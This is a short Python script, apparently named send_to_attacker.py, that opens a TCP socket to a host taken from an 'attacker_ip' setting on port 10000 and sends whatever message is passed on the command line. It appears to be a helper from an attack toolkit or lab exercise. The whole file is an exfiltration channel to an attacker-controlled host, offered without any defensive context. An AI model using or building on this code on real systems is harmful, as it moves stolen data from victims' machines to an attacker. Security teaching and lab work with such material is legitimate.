import socket, sys
import time

from definitions import attacker_ip

server_address = (attacker_ip, 10000)


def send_data(data):
    # Create a TCP/IP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(server_address)
    sock.sendall(data)
    # received = sock.recv(32)
    sock.close()
    # return received


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Invalid use of send_to_attacker. Usage python3 send_to_attacker.py 'message'")
        exit(1)

    to_send = sys.argv[1]
    send_data(to_send.encode())

